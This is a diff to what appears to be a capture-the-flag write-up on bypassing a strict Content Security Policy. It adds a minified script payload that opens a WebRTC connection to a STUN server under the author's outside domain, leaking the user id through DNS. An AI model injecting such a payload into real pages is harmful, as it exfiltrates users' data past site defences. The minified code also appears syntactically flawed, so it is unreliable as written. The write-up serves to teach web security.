@@ -102,7 +102,15 @@ default-src 'none'; style-src 'self'; script-src 'unsafe-inline'; frame-ancestor
 
 I then reading through all non-fetch directives in CSP, and some research. While getting ready to go to bed, thinking about all the cases where a webpage makes request to server, WebRTC came to my mind (I have also noticed [a very new TR about WebRTC](https://www.w3.org/TR/webrtc-nv-use-cases/), which may or may not be related). As I do not know much about WebRTC, I put a message on our Discord channel before I went to bed.
 
-The next morning, I started with some WebRTC examples. The payload is limited to only 200 characters, with some trial and error, I managed to craft a minimal payload that would do DNS request for the STUN server I specify (the payload has been modified to be more readable):
+The next morning, I started with some WebRTC examples. The payload is limited to only 200 characters, with some trial and error, I managed to craft a minimal payload (and minified with <https://www.toptal.com/developers/javascript-minifier>) that would do DNS request for the STUN server I specify:
+
+{% raw %}
+```html
+<script>async function a(){c=({iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:1337"}]})(p=new RTCPeerConnection(c)).createDataChannel("d"),await p.setLocalDescription()}a();</script>
+```
+{% endraw %}
+
+With whitespace added to make it be more readable in the blogpost (however it's more than 200 characters including whitespace):
 
 {% raw %}
 ```html
